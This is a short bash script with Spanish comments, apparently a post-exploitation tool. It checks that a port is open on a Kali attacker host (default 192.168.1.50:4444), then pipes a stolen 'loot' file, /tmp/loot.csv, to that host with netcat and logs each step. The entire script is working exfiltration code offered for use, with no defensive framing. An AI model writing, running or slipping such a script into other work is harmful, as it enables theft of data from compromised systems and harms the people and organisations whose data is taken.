#!/bin/bash

# Exfiltra loot via nc. Verifica si puerto abierto.

KALI_IP=${1:-192.168.1.50}
PORT=${2:-4444}

if ! nc -z "$KALI_IP" "$PORT" 2>/dev/null; then
    echo "[-] Puerto $PORT no abierto en $KALI_IP. Exfil fallido." | tee -a /var/log/postops.log
    exit 1
fi

echo "[+] Exfiltrando loot..." | tee -a /var/log/postops.log
nc "$KALI_IP" "$PORT" < /tmp/loot.csv || { echo "Error en nc"; exit 1; }
echo "[+] Exfil completado" | tee -a /var/log/postops.log
